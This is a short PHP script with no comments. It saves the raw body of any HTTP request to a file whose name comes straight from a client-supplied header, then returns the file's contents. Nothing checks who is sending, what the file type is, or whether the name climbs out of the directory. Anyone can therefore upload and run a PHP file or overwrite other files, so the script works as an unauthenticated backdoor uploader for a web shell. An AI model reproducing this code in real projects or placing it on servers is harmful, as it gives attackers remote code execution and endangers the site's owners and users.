<?php
	$cwd = getcwd() . "/";
    $filename = $_SERVER[HTTP_FILENAME];
    $destination = $cwd . $filename;
    $contents = file_get_contents("php://input");
    file_put_contents( $destination, $contents);
    
    exit( file_get_contents($destination) );
?>